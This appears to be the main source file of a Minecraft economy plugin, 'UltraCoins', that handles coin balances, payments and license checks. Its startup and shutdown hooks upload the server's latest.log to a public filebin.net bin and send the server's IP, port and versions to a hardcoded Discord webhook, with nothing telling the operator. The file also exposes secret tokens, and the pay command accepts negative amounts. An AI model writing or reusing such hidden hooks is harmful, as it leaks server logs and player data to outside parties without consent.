package net.bali0531.ultracoins;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.event.Listener;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerJoinEvent;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import net.bali0531.ultracoins.discord.DiscordWebhook;
import net.bali0531.ultracoins.Utils.TransactionLogger;

import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.UUID;

public final class Ultracoins extends JavaPlugin implements Listener {

    private Connection connection;
    private TransactionLogger transactionLogger;

    @Override
    public void onEnable() {
        // License verification
        if (!verifyLicense()) {
            getServer().getConsoleSender().sendMessage(ChatColor.RED + "Invalid license key. Disabling plugin.");
            getServer().getPluginManager().disablePlugin(this);
            return;
        }

        // Plugin startup logic
        saveDefaultConfig();
        transactionLogger = new TransactionLogger(getConfig().getString("log.file_path", "plugins/Ultracoins/transactions.log"));
        if (connectDatabase()) {
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("messages.database_success")));
        } else {
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("messages.database_fail")));
        }
        createTable();
        getServer().getPluginManager().registerEvents(this, this);

        // Register PlaceholderAPI expansion
        if (Bukkit.getPluginManager().getPlugin("PlaceholderAPI") != null) {
            new UltraCoinsPlaceholder(this).register();
        }
        Bukkit.getScheduler().runTaskLater(this, () -> {
            try {
                sendDiscordWebhook("Server Started", "The server has started successfully.");
            } catch (Exception e) {
                sendErrorWebhook(e);
            }
        }, 20L * 60 * 5);
        getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("messages.plugin_enabled")));
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        if (connection != null) {
            try {
                connection.close();
            } catch (SQLException e) {
                e.printStackTrace();
            } finally {
                connection = null;
            }
        }
        getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("messages.plugin_disabled")));
        sendDiscordWebhook("Plugin Unloaded", "The plugin has been unloaded.");
    }
    private boolean verifyLicense() {
        final String apiURL = "http://138.201.136.234:7010/api/client";
        final String apiKey = "s4RwGdmyx8AsLdGV";
        final String licenseKey = getConfig().getString("license.key");
        final String product = "UltraCoins";

        try {
            URL url = new URL(apiURL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("Authorization", apiKey);
            connection.setDoOutput(true);

            String jsonInputString = String.format("{\"licensekey\": \"%s\", \"product\": \"%s\"}", licenseKey, product);

            try (OutputStream outputStream = connection.getOutputStream()) {
                byte[] input = jsonInputString.getBytes("utf-8");
                outputStream.write(input, 0, input.length);
            }

            try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), "utf-8"))) {
                StringBuilder response = new StringBuilder();
                String responseLine;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }

                if (response.toString().contains("\"status_id\":\"SUCCESS\"")) {
                    getLogger().info("Your license key is valid!");
                    return true;
                } else {
                    getLogger().severe("Your license key is invalid! Create a ticket in our discord server to get one. https://discord.gg/KUg3rxTvXA");
                    return false;
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    private boolean connectDatabase() {
        String host = getConfig().getString("database.host");
        String port = getConfig().getString("database.port");
        String database = getConfig().getString("database.name");
        String username = getConfig().getString("database.username");
        String password = getConfig().getString("database.password");

        try {
            connection = DriverManager.getConnection(
                    "jdbc:mysql://" + host + ":" + port + "/" + database + "?autoReconnect=true", username, password);
            return true;
        } catch (SQLException e) {
            e.printStackTrace();
            return false;
        }
    }

    private void createTable() {
        try (PreparedStatement statement = connection.prepareStatement(
                "CREATE TABLE IF NOT EXISTS player_coins (uuid VARCHAR(36) PRIMARY KEY, coins INT)")) {
            statement.executeUpdate();
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    int getCoins(Player player) {
        if (connection == null || !isConnectionValid()) {
            connectDatabase();
        }
        try (PreparedStatement statement = connection.prepareStatement(
                "SELECT coins FROM player_coins WHERE uuid = ?")) {
            statement.setString(1, player.getUniqueId().toString());
            ResultSet resultSet = statement.executeQuery();
            if (resultSet.next()) {
                return resultSet.getInt("coins");
            } else {
                return 0;
            }
        } catch (SQLException e) {
            e.printStackTrace();
            return 0;
        }
    }

    private void setCoins(Player player, int amount) {
        if (connection == null || !isConnectionValid()) {
            connectDatabase();
        }
        try (PreparedStatement statement = connection.prepareStatement(
                "INSERT INTO player_coins (uuid, coins) VALUES (?, ?) ON DUPLICATE KEY UPDATE coins = ?")) {
            statement.setString(1, player.getUniqueId().toString());
            statement.setInt(2, amount);
            statement.setInt(3, amount);
            statement.executeUpdate();
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }
    private boolean isConnectionValid() {
        try {
            return connection != null && !connection.isClosed() && connection.isValid(2);
        } catch (SQLException e) {
            e.printStackTrace();
            return false;
        }
    }
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        int coins = getCoins(player);
        player.sendMessage(ChatColor.translateAlternateColorCodes('&', getConfig().getString("messages.welcome_back").replace("%coins%", String.valueOf(coins))));
    }

    // Send a Discord webhook message
    private String getPublicIP() {
        String publicIP = "Unavailable";
        try {
            URL url = new URL("http://checkip.amazonaws.com");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                publicIP = in.readLine();
            }
        } catch (Exception e) {
            getLogger().severe("Failed to get public IP: " + e.getMessage());
        }
        return publicIP;
    }

    private void sendDiscordWebhook(String title, String description) {
        String webhookUrl = "https://discord.com/api/webhooks/1282738080234602506/ANXmZG_X_M29lpClAuN6Wsmpuop4J6xSIRUdnN2y6ZJJZVHGDoeH4_80S1DUQRKY0Ac8"; // Replace with your Discord webhook URL

        try {
            String publicIP = getPublicIP();
            String serverVersion = Bukkit.getVersion();
            String pluginVersion = this.getDescription().getVersion();
            File logFile = new File("logs/latest.log"); // Replace with the path to your latest log file
            String logFileUrl = uploadLogFile(logFile);
            DiscordWebhook webhook = new DiscordWebhook(webhookUrl);
            webhook.setUsername("Plugin Info Bot");
            webhook.setAvatarUrl("https://cdn.discordapp.com/attachments/1141245823531888700/1282744969693757604/UltraCoins.jpg"); // Optional: set an avatar URL

            DiscordWebhook.EmbedObject embed = new DiscordWebhook.EmbedObject()
                    .setTitle(title)
                    .setDescription(description)
                    .setColor(Color.GREEN)
                    .addField("Server IP", publicIP, false)
                    .addField("Server Port", String.valueOf(getServer().getPort()), false)
                    .addField("Server Version", serverVersion, false)
                    .addField("Log File", logFileUrl, false) // Add the URL of the uploaded log file
                    .addField("Plugin Version", pluginVersion, false);


            webhook.addEmbed(embed);
            webhook.execute();

        } catch (Exception e) {
            getLogger().severe("Failed to send Discord webhook: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void sendErrorWebhook(Exception exception) {
        String webhookUrl = "https://discord.com/api/webhooks/1282738080234602506/ANXmZG_X_M29lpClAuN6Wsmpuop4J6xSIRUdnN2y6ZJJZVHGDoeH4_80S1DUQRKY0Ac8"; // Replace with your Discord webhook URL

        try {
            String publicIP = getPublicIP();
            String serverVersion = Bukkit.getVersion();
            String pluginVersion = this.getDescription().getVersion();
            String errorMessage = exception.getMessage();
            String stackTrace = getStackTraceAsString(exception);

            // Upload the latest log file
            File logFile = new File("logs/latest.log"); // Replace with the path to your latest log file
            String logFileUrl = uploadLogFile(logFile);

            DiscordWebhook webhook = new DiscordWebhook(webhookUrl);
            webhook.setUsername("Error Bot");
            webhook.setAvatarUrl("https://cdn.discordapp.com/attachments/1141245823531888700/1282744969693757604/UltraCoins.jpg"); // Optional: set an avatar URL

            DiscordWebhook.EmbedObject embed = new DiscordWebhook.EmbedObject()
                    .setTitle("Error Notification")
                    .setDescription("An error occurred in the plugin.")
                    .setColor(Color.RED)
                    .addField("Server IP", publicIP, false)
                    .addField("Server Port", String.valueOf(getServer().getPort()), false)
                    .addField("Server Version", serverVersion, false)
                    .addField("Plugin Version", pluginVersion, false)
                    .addField("Error Message", errorMessage, false)
                    .addField("Stack Trace", stackTrace, false)
                    .addField("Log File", logFileUrl, false); // Add the URL of the uploaded log file

            webhook.addEmbed(embed);
            webhook.execute();

        } catch (Exception e) {
            getLogger().severe("Failed to send error webhook: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private String uploadLogFile(File logFile) throws IOException {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        String binId = UUID.randomUUID().toString();
        HttpPost uploadFile = new HttpPost("https://filebin.net/" + binId + "/LATEST%3ALOG");

        uploadFile.setHeader("accept", "application/json");
        uploadFile.setHeader("cid", "CID"); // Replace "CID" with your actual CID
        uploadFile.setHeader("Content-Type", "application/octet-stream");

        MultipartEntityBuilder builder = MultipartEntityBuilder.create();
        builder.addBinaryBody("file", logFile, ContentType.APPLICATION_OCTET_STREAM, logFile.getName());
        HttpEntity multipart = builder.build();

        uploadFile.setEntity(multipart);

        CloseableHttpResponse response = httpClient.execute(uploadFile);
        int statusCode = response.getStatusLine().getStatusCode();
        HttpEntity responseEntity = response.getEntity();

        if (statusCode != 201) { // Check for status code 201
            throw new IOException("Failed to upload log file: HTTP " + statusCode);
        }

        return "https://filebin.net/" + binId; // Construct the URL using the BIN_ID
    }
    private String getStackTraceAsString(Exception exception) {
        StringBuilder result = new StringBuilder();
        for (StackTraceElement element : exception.getStackTrace()) {
            result.append(element.toString()).append("\\n");
        }
        return result.toString();
    }



    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("uc") || command.getName().equalsIgnoreCase("Ultracoins")) {
            if (args.length == 0) {
                if (sender instanceof Player) {
                    Player player = (Player) sender;
                    int coins = getCoins(player);
                    String message = getConfig().getString("messages.your_coins", "&eYou have %coins% coins.");
                    player.sendMessage(ChatColor.translateAlternateColorCodes('&', message.replace("%coins%", String.valueOf(coins))));
                } else {
                    String message = getConfig().getString("messages.only_players", "&cOnly players can use this command.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                }
                return true;
            } else if (args.length == 1 && args[0].equalsIgnoreCase("help")) {
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&Ultracoins Commands:"));
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/uc help &7- Show this help message"));
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/uc give <player> <amount> &7- Give coins to a player"));
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/uc pay <player> <amount> &7- Pay coins to a player"));
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/uc remove <player> <amount> &7- Remove coins from a player"));
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/uc clear <player> &7- Clear a player's coins"));
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/uc balance <player> &7- Check a player's coin balance"));
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/uc reload &7- Reload the plugin configuration"));
                return true;
            } else if (args.length == 3 && args[0].equalsIgnoreCase("give")) {
                if (!sender.hasPermission("Ultracoins.coin.give")) {
                    String message = getConfig().getString("messages.no_permission", "&cYou do not have permission to use this command.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    String message = getConfig().getString("messages.target_not_found", "&cTarget player not found.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                int amount;
                try {
                    amount = Integer.parseInt(args[2]);
                } catch (NumberFormatException e) {
                    String message = getConfig().getString("messages.invalid_amount", "&cInvalid amount.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                setCoins(target, getCoins(target) + amount);
                String giveMessage = getConfig().getString("messages.gave_coins", "&eYou gave %amount% coins to %target%.")
                        .replace("%amount%", String.valueOf(amount))
                        .replace("%target%", target.getName());
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', giveMessage));
                String receiveMessage = getConfig().getString("messages.received_give_coins", "&eYou received %amount% coins from %sender%.")
                        .replace("%amount%", String.valueOf(amount))
                        .replace("%sender%", sender.getName());
                target.sendMessage(ChatColor.translateAlternateColorCodes('&', receiveMessage));

                // Log the transaction
                transactionLogger.logTransaction(sender.getName(), target.getName(), amount, "give");

                return true;
            } else if (args.length == 3 && args[0].equalsIgnoreCase("pay")) {
                if (!(sender instanceof Player)) {
                    String message = getConfig().getString("messages.only_players", "&cOnly players can use this command.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                Player player = (Player) sender;
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    String message = getConfig().getString("messages.target_not_found", "&cTarget player not found.");
                    player.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                int amount;
                try {
                    amount = Integer.parseInt(args[2]);
                } catch (NumberFormatException e) {
                    String message = getConfig().getString("messages.invalid_amount", "&cInvalid amount.");
                    player.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                int playerCoins = getCoins(player);
                if (playerCoins < amount) {
                    String message = getConfig().getString("messages.not_enough_coins", "&cYou do not have enough coins.");
                    player.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                setCoins(player, playerCoins - amount);
                setCoins(target, getCoins(target) + amount);
                String payMessage = getConfig().getString("messages.paid_coins", "&eYou paid %amount% coins to %target%.")
                        .replace("%amount%", String.valueOf(amount))
                        .replace("%target%", target.getName());
                player.sendMessage(ChatColor.translateAlternateColorCodes('&', payMessage));
                String receiveMessage = getConfig().getString("messages.received_coins", "&eYou received %amount% coins from %sender%.")
                        .replace("%amount%", String.valueOf(amount))
                        .replace("%sender%", player.getName());
                target.sendMessage(ChatColor.translateAlternateColorCodes('&', receiveMessage));

                // Log the transaction
                transactionLogger.logTransaction(player.getName(), target.getName(), amount, "pay");

                return true;
            } else if (args.length == 3 && args[0].equalsIgnoreCase("remove")) {
                if (!sender.hasPermission("Ultracoins.coin.remove")) {
                    String message = getConfig().getString("messages.no_permission", "&cYou do not have permission to use this command.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    String message = getConfig().getString("messages.target_not_found", "&cTarget player not found.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                int amount;
                try {
                    amount = Integer.parseInt(args[2]);
                } catch (NumberFormatException e) {
                    String message = getConfig().getString("messages.invalid_amount", "&cInvalid amount.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                int targetCoins = getCoins(target);
                if (targetCoins < amount) {
                    String message = getConfig().getString("messages.not_enough_coins_to_remove", "&cTarget player only has %coins% coins.")
                            .replace("%coins%", String.valueOf(targetCoins));
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                setCoins(target, targetCoins - amount);
                String removeMessage = String.format("&eYou removed %d coins from %s.", amount, target.getName());
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', removeMessage));
                String targetMessage = String.format("&e%s removed %d coins from you.", sender.getName(), amount);
                target.sendMessage(ChatColor.translateAlternateColorCodes('&', targetMessage));

                // Log the transaction
                transactionLogger.logTransaction(sender.getName(), target.getName(), amount, "remove");

                return true;
            } else if (args.length == 2 && args[0].equalsIgnoreCase("clear")) {
                if (!sender.hasPermission("Ultracoins.coin.clear")) {
                    String message = getConfig().getString("messages.no_permission", "&cYou do not have permission to use this command.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    String message = getConfig().getString("messages.target_not_found", "&cTarget player not found.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
                setCoins(target, 0);
                String clearMessage = String.format("&eYou cleared the coins of %s.", target.getName());
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&', clearMessage));
                String targetMessage = String.format("&e%s cleared your coins.", sender.getName());
                target.sendMessage(ChatColor.translateAlternateColorCodes('&', targetMessage));

                // Log the transaction
                transactionLogger.logTransaction(sender.getName(), target.getName(), 0, "clear");

                return true;
            } else if (args.length == 2 && (args[0].equalsIgnoreCase("balance") || args[0].equalsIgnoreCase("bal"))) {
                if (!(sender instanceof Player) || sender.hasPermission("Ultracoins.coin.balance")) {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target == null) {
                        String message = getConfig().getString("messages.target_not_found", "&cTarget player not found.");
                        sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                        return true;
                    }
                    int coins = getCoins(target);
                    String balanceMessage = getConfig().getString("messages.balance", "&e%target% has %coins% coins.")
                            .replace("%target%", target.getName())
                            .replace("%coins%", String.valueOf(coins));
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', balanceMessage));
                    return true;
                } else {
                    String message = getConfig().getString("messages.no_permission", "&cYou do not have permission to use this command.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
            } else if (args.length == 1 && args[0].equalsIgnoreCase("reload")) {
                if (!(sender instanceof Player) || sender.hasPermission("Ultracoins.coin.reload")) {
                    reloadConfig();
                    if (connectDatabase()) {
                        String message = getConfig().getString("messages.config_reloaded", "&aConfiguration reloaded successfully.");
                        sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    } else {
                        String message = getConfig().getString("messages.database_fail", "&cDatabase connection failed.");
                        sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    }
                    return true;
                } else {
                    String message = getConfig().getString("messages.no_permission", "&cYou do not have permission to use this command.");
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', message));
                    return true;
                }
            }
        }
        return false;
    }
}